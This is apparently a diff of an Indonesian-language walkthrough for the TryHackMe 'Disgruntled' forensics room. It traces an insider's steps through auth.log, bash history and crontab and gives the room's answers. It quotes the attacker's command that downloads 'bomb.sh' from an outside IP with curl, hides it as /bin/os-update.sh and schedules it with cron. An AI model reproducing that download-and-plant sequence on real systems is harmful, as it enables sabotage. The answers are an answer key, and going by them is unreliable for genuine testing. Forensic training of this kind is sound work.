@@ -8,12 +8,16 @@
 ssh root@IP_Machine
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%201.JPG)
+
 ## Task 3 Nothing suspicious... So far
 - **Pertanyaan:** The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
 - Untuk menemukan jawabannya kita bisa mengecek file **/var/log/auth.log**. Kemudian untuk menginstall package biasanya diikuti kata "install", sehingga kita bisa memfilter log yang mengandung kata "install"
 ```sh
 cat /var/log/auth.log | grep install
 ```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%202.JPG)
 
 - **Jawaban:**
 ```sh
@@ -22,6 +26,8 @@ cat /var/log/auth.log | grep install
 
 - **Pertanyaan:** What was the present working directory (PWD) when the previous command was run?
 - Tinggal kita lihat nilai PWD di log
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%203.JPG)
 
 - **Jawaban:**
 ```sh
@@ -35,6 +41,8 @@ cat /var/log/auth.log | grep install
 cat /var/log/auth.log | grep adduser
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%204.JPG)
+
 - **Jawaban:**
 ```sh
 it-admin
@@ -45,6 +53,8 @@ it-admin
 ```sh
 cat /var/log/auth.log | grep visudo
 ```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%205.JPG)
 
 - **Jawaban:**
 ```sh
@@ -57,6 +67,8 @@ Dec 28 06:27:34
 cat /var/log/auth.log | grep vi
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%206.JPG)
+
 - **Jawaban:**
 ```sh
 bomb.sh
@@ -66,10 +78,14 @@ bomb.sh
 - **Pertanyaan:** What is the command used that created the file `bomb.sh` ?
 - Dari pertanyaan Task 4, kita mengetahui bahwa file `bomb.sh` berada di path **/home/it-admin**
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%207.JPG)
+
 - Kemudian kita lihat riwayat perintah di path tersebut dengan bash history
 ```sh
 cat /home/it-admin/.bash_history
 ```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%208.JPG)
 
 - **Jawaban:**
 ```sh
@@ -78,6 +94,10 @@ curl 10.10.158.38:8080/bomb.sh --output bomb.sh
 
 - **Pertanyaan:** The file was renamed and moved to a different directory. What is the full path of this file now?
 - Dari pertanyaan Task 4, kita mengetahui bahwa penyerang menggunakan vi editor jadi kita bisa mengecek riwayat entry kemudian memfilter riwayat yang mengandung kata "saveas" untuk melacak perubahan nama file
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%209.JPG)
+
+- **Jawaban:**
 ```sh
 /bin/os-update.sh
 ```
@@ -88,10 +108,14 @@ curl 10.10.158.38:8080/bomb.sh --output bomb.sh
 ls -la /bin | grep os-update
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2010.JPG)
+
 - Kita dapat menggunakan tool date untuk menampilkan detail waktunya
 ```sh
 date -r /bin/os-update.sh
 ```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2011.JPG)
 
 - **Jawaban:**
 ```sh
@@ -104,7 +128,24 @@ Dec 28 06:29
 cat /bin/os-update.sh
 ```
 
-**Jawaban:**
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2012.JPG)
+
+- **Jawaban:**
 ```sh
 goodbye.txt
+```
+
+## Task 6 Following the fuse
+- **Pertanyaan:** At what time will the malicious file trigger? (Format: HH:MM AM/PM)
+- Jika kita mempunyai malicious yang siap dijalankan maka file tersebut sudah pasti terjadwal di cron job. Kita bisa memeriksa file /etc/crontab untuk memastikannya
+```sh
+cat /etc/crontab
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2013.JPG)
+
+- Secara berurutan setiap kolomnya mendefinisikan menit, jam, hari dalam sebulan, bulan, dan hari dalam seminggu.
+- **Jawaban:**
+```sh
+08:00 AM
 ```
